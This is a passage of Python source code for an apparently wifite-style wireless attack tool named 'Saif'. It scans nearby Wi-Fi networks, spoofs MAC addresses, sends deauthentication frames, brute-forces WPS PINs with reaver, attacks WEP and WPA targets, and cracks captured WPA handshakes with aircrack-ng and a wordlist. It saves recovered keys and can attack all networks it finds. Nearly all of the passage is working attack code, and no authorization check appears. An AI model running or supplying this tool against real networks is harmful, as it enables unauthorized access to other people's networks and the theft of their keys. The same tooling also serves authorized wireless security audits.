                        print(f"\n\n{Colors.GREEN} [+] {Colors.END}WPS PIN found: {Colors.C}{pin}{Colors.END}")
                        print(f"{Colors.GREEN} [+] {Colors.END}WPA Key found: {Colors.C}{key}{Colors.END}")
                        self._save_result(pin, key)
                        proc.terminate()
                        return True
                        
                    # Check for lockout
                    if 'WPS transaction failed (code: 0x03)' in content:
                        print(f"\n{Colors.R} [!] WPS may be locked{Colors.END}")
                        break
                        
                # Update display
                print(f"\r{Colors.GREEN} [{elapsed}s] {Colors.END}"
                      f"Progress: {percent if 'percent' in locals() else '0.00%'} | "
                      f"Tries: {tries}/{total} | "
                      f"Retries: {retries}{Colors.END}", end='')
                sys.stdout.flush()
                
                # Check timeout
                if self.config.wps_timeout > 0 and elapsed > self.config.wps_timeout:
                    print(f"\n{Colors.O} [!] Attack timeout{Colors.END}")
                    break
                    
        except KeyboardInterrupt:
            print(f"\n{Colors.O} [!] Attack interrupted{Colors.END}")
            
        finally:
            proc.terminate()
            
        return False
    
    def _save_result(self, pin: str, key: str):
        """Save cracked WPS result"""
        self.target.key = key
        self.target.wps = pin
        self.config.save_cracked(self.target)
        self.config.wpa_findings.append(
            f"WPS cracked {self.target.ssid}: PIN={pin}, KEY={key}"
        )


def check_requirements() -> bool:
    """Check if required tools are installed"""
    required = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng']
    optional = ['reaver', 'tshark', 'pyrit', 'cowpatty']
    
    missing = []
    for tool in required:
        if not shutil.which(tool):
            missing.append(tool)
            
    if missing:
        print(f"{Colors.R} [!] Missing required tools: {', '.join(missing)}{Colors.END}")
        print(f"{Colors.O}     Install aircrack-ng suite{Colors.END}")
        return False
        
    # Check optional tools
    for tool in optional:
        if not shutil.which(tool):
            print(f"{Colors.O} [!] Optional tool missing: {tool}{Colors.END}")
            
    return True


def main():
    """Main execution function"""
    # Parse arguments
    parser = argparse.ArgumentParser(description='Saif - Modern Wireless Auditor')
    
    # Target options
    parser.add_argument('-i', '--interface', help='Wireless interface')
    parser.add_argument('-m', '--monitor', help='Interface already in monitor mode')
    parser.add_argument('-c', '--channel', type=int, help='Channel to scan')
    parser.add_argument('-e', '--essid', help='Target ESSID')
    parser.add_argument('-b', '--bssid', help='Target BSSID')
    parser.add_argument('--all', action='store_true', help='Attack all targets')
    parser.add_argument('--showb', action='store_true', help='Show BSSIDs in scan')
    parser.add_argument('--power', type=int, help='Minimum power level')
    parser.add_argument('--mac', action='store_true', help='Spoof MAC address')
    parser.add_argument('--no-deauth', action='store_true', help='Disable deauth during scan')
    
    # Attack selection
    parser.add_argument('--wpa', action='store_true', help='Enable WPA attacks')
    parser.add_argument('--wep', action='store_true', help='Enable WEP attacks')
    parser.add_argument('--wps', action='store_true', help='Enable WPS attacks')
    parser.add_argument('--pixie', action='store_true', help='Pixie-dust only')
    
    # WPA options
    parser.add_argument('--crack', metavar='WORDLIST', help='Crack handshakes')
    parser.add_argument('--wpadt', type=int, default=10, help='Deauth timeout')
    parser.add_argument('--wpat', type=int, default=500, help='Attack timeout')
    
    # WEP options
    parser.add_argument('--pps', type=int, default=600, help='Packets per second')
    parser.add_argument('--wept', type=int, default=600, help='Attack timeout')
    parser.add_argument('--wepca', type=int, default=10000, help='IVs to crack')
    
    # WPS options
    parser.add_argument('--wpst', type=int, default=660, help='Attack timeout')
    
    # Other
    parser.add_argument('--cracked', action='store_true', help='Show cracked targets')
    parser.add_argument('--recrack', action='store_true', help='Include cracked targets')
    parser.add_argument('--quiet', action='store_true', help='Quiet mode')
    
    args = parser.parse_args()
    
    # Show banner
    banner()
    
    # Check root
    if os.geteuid() != 0:
        print(f"{Colors.R} [!] Must be run as root{Colors.END}")
        sys.exit(1)
        
    # Check requirements
    if not check_requirements():
        sys.exit(1)
    
    # Initialize configuration
    config = Configuration()
    
    # Apply arguments
    if args.interface:
        config.interface = args.interface
    if args.monitor:
        config.monitor_interface = args.monitor
    if args.channel:
        config.target_channel = args.channel
    if args.essid:
        config.target_essid = args.essid
    if args.bssid:
        config.target_bssid = args.bssid
    if args.all:
        config.attack_all = True
    if args.showb:
        config.show_mac_in_scan = True
    if args.power:
        config.min_power = args.power
    if args.mac:
        config.mac_spoof = True
    if args.no_deauth:
        config.send_deauths = False
    if args.quiet:
        config.verbose = False
    if args.recrack:
        config.show_cracked = True
        
    # Attack selection
    if args.wpa or args.wep or args.wps:
        config.wpa_enabled = args.wpa
        config.wep_enabled = args.wep
        config.wps_enabled = args.wps
    if args.pixie:
        config.wps_pixie = True
        config.wps_enabled = True
        
    # WPA options
    if args.crack:
        config.wpa_crack = True
        if os.path.exists(args.crack):
            config.wpa_dictionary = args.crack
    if args.wpadt:
        config.wpa_deauth_timeout = args.wpadt
    if args.wpat:
        config.wpa_timeout = args.wpat
        
    # WEP options
    if args.pps:
        config.wep_pps = args.pps
    if args.wept:
        config.wep_timeout = args.wept
    if args.wepca:
        config.wep_crack_at = args.wepca
        
    # WPS options
    if args.wpst:
        config.wps_timeout = args.wpst
        
    # Show cracked
    if args.cracked:
        if not config.cracked_targets:
            print(f"{Colors.O} [!] No cracked targets found{Colors.END}")
        else:
            print(f"{Colors.GREEN} [+] {Colors.END}Cracked targets:")
            for t in config.cracked_targets:
                if t.wps:
                    print(f"     {Colors.C}{t.ssid}{Colors.END} ({t.bssid}): "
                          f"Key={Colors.GREEN}{t.key}{Colors.END}, "
                          f"PIN={Colors.GREEN}{t.wps}{Colors.END}")
                else:
                    print(f"     {Colors.C}{t.ssid}{Colors.END} ({t.bssid}): "
                          f"{Colors.GREEN}{t.key}{Colors.END}")
        sys.exit(0)
    
    try:
        # Initialize interface
        iface_mgr = InterfaceManager(config)
        
        # Get interface
        if not config.monitor_interface:
            monitors, adapters = iface_mgr.get_interfaces()
            
            if monitors:
                config.monitor_interface = monitors[0]
                print(f"{Colors.GREEN} [+] {Colors.END}Using monitor interface: "
                      f"{Colors.GREEN}{config.monitor_interface}{Colors.END}")
            elif config.interface:
                config.monitor_interface = iface_mgr.enable_monitor_mode(config.interface)
            elif adapters:
                print(f"{Colors.GREEN} [+] {Colors.END}Available interfaces:")
                for i, iface in enumerate(adapters, 1):
                    print(f"     {i}. {iface}")
                choice = input(f"{Colors.GREEN} [+] {Colors.END}Select interface: ")
                try:
                    idx = int(choice) - 1
                    if 0 <= idx < len(adapters):
                        config.monitor_interface = iface_mgr.enable_monitor_mode(adapters[idx])
                except:
                    pass
            else:
                print(f"{Colors.R} [!] No wireless interfaces found{Colors.END}")
                sys.exit(1)
                
        if not config.monitor_interface:
            print(f"{Colors.R} [!] Failed to get monitor interface{Colors.END}")
            sys.exit(1)
            
        # Get current MAC
        config.current_mac = iface_mgr._random_mac()  # Simplified
        
        # Scan for targets
        scanner = Scanner(config, iface_mgr)
        targets, clients = scanner.scan(config.target_channel)
        
        if not targets:
            print(f"{Colors.O} [!] No targets selected{Colors.END}")
            sys.exit(0)
            
        # Attack targets
        wpa_success = 0
        wep_success = 0
        wps_success = 0
        
        for target in targets:
            print(f"\n{Colors.GREEN} {'='*60}{Colors.END}")
            print(f"{Colors.GREEN} [+] {Colors.END}Attacking {Colors.C}{target.ssid}{Colors.END}")
            print(f"{Colors.GREEN} {'='*60}{Colors.END}")
            
            # Get clients for this target
            target_clients = [c for c in clients if c.station == target.bssid]
            
            # Choose attack based on encryption
            if 'WPA' in target.encryption:
                if config.wps_enabled and target.wps:
                    wps = WPSAttack(config, config.monitor_interface, target)
                    if wps.run():
                        wps_success += 1
                        continue
                        
                if config.wpa_enabled:
                    wpa = WPAAttack(config, config.monitor_interface, target, target_clients)
                    if wpa.run():
                        wpa_success += 1
                        
            elif 'WEP' in target.encryption and config.wep_enabled:
                wep = WEPAttack(config, config.monitor_interface, target, target_clients)
                if wep.run():
                    wep_success += 1
                    
        # Show summary
        print(f"\n{Colors.GREEN} {'='*60}{Colors.END}")
        print(f"{Colors.GREEN} [+] Attack Summary{Colors.END}")
        print(f"{Colors.GREEN} {'='*60}{Colors.END}")
        
        if wps_success > 0:
            print(f"{Colors.GREEN} [+] WPS: {wps_success} successful{Colors.END}")
        if wpa_success > 0:
            print(f"{Colors.GREEN} [+] WPA: {wpa_success} successful{Colors.END}")
        if wep_success > 0:
            print(f"{Colors.GREEN} [+] WEP: {wep_success} successful{Colors.END}")
            
        # Crack WPA handshakes
        if config.wpa_crack and config.wpa_handshakes and config.wpa_dictionary:
            print(f"\n{Colors.GREEN} [+] {Colors.END}Cracking WPA handshakes...")
            for cap in config.wpa_handshakes:
                cracker = WPACracker(config, cap)
                cracker.run()
                
    except KeyboardInterrupt:
        print(f"\n{Colors.O} [!] Interrupted{Colors.END}")
        
    finally:
        # Cleanup
        iface_mgr.disable_monitor_mode()
        config.cleanup()
        print(f"{Colors.GREEN} [+] {Colors.END}Done")


class WPACracker:
    """WPA handshake cracker using aircrack-ng"""
    
    def __init__(self, config: Configuration, capfile: CapFile):
        self.config = config
        self.capfile = capfile
        
    def run(self):
        """Crack handshake"""
        print(f"{Colors.GREEN} [+] {Colors.END}Cracking {self.capfile.ssid}...")
        
        temp_out = os.path.join(self.config.TEMP_DIR, 'crack.out')
        temp_key = os.path.join(self.config.TEMP_DIR, 'key.txt')
        
        cmd = [
            'aircrack-ng',
            '-a', '2',
            '-w', self.config.wpa_dictionary,
            '-l', temp_key,
            '-b', self.capfile.bssid,
            self.capfile.filename
        ]
        
        with open(temp_out, 'w') as f:
            proc = subprocess.Popen(cmd, stdout=f, stderr=DEVNULL)
            
        start_time = time.time()
        
        try:
            while proc.poll() is None:
                time.sleep(2)
                elapsed = int(time.time() - start_time)
                
                # Parse progress
                if os.path.exists(temp_out):
                    with open(temp_out, 'r') as f:
                        content = f.read()
                        
                    # Extract keys tested
                    match = re.search(r'(\d+)\s+keys tested', content)
                    if match:
                        keys = int(match.group(1))
                        
                    # Extract speed
                    match = re.search(r'\((\d+\.\d+)\s+k/s\)', content)
                    if match:
                        speed = float(match.group(1))
                        
                    print(f"\r{Colors.GREEN} [{elapsed}s] {Colors.END}"
                          f"Tested: {keys if 'keys' in locals() else 0} keys "
                          f"({speed if 'speed' in locals() else 0:.1f} k/s)", end='')
                    sys.stdout.flush()
                    
        except KeyboardInterrupt:
            proc.terminate()
            
        # Check result
        if os.path.exists(temp_key):
            with open(temp_key, 'r') as f:
                key = f.read().strip()
            if key:
                print(f"\n\n{Colors.GREEN} [+] {Colors.END}Key found: "
                      f"{Colors.C}{key}{Colors.END}")
                
                # Save to cracked
                t = Target(self.capfile.bssid, 0, 0, 0, 'WPA', self.capfile.ssid)
                t.key = key
                self.config.save_cracked(t)
            else:
                print(f"\n{Colors.O} [!] Key not found in dictionary{Colors.END}")
        else:
            print(f"\n{Colors.O} [!] Cracking failed{Colors.END}")
            
        # Cleanup
        try:
            os.remove(temp_out)
            os.remove(temp_key)
        except:
            pass


if __name__ == '__main__':
    main()